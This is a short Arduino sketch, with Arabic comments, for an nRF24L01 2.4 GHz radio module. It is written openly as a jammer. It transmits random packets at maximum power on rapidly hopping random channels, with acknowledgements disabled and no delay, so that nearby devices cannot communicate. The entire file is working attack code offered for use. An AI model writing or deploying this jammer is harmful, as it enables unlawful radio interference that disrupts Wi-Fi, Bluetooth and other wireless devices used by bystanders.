#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

#define CE_PIN  4
#define CSN_PIN 5

RF24 radio(CE_PIN, CSN_PIN);

void setup() {
    Serial.begin(115200);
    radio.begin();
    radio.setPALevel(RF24_PA_MAX);  // تعيين أقصى طاقة إرسال
    radio.setDataRate(RF24_250KBPS); // تقليل معدل البيانات لجعل التشويش أكثر استمرارية
    radio.setAutoAck(false); // تعطيل تأكيد الاستلام لضمان إرسال حزم سريعة
}

void loop() {
    byte jammingData[32]; // حزمة بيانات عشوائية بحجم 32 بايت

    // إنشاء بيانات عشوائية داخل الحزمة
    for (int i = 0; i < 32; i++) {
        jammingData[i] = random(0, 256);
    }

    // التشويش على عدة قنوات في نفس الوقت
    for (int i = 0; i < 5; i++) {  // إرسال على 5 قنوات مختلفة بسرعة
        int channel = random(0, 125); // اختيار قناة عشوائية بين 0 و 125
        radio.setChannel(channel); // تغيير القناة
        radio.stopListening(); // التبديل لوضع الإرسال
        radio.write(jammingData, sizeof(jammingData)); // إرسال الحزمة
    }

    // لا يوجد تأخير حتى لا نعطي فرصة للأجهزة الأخرى للاتصال
}
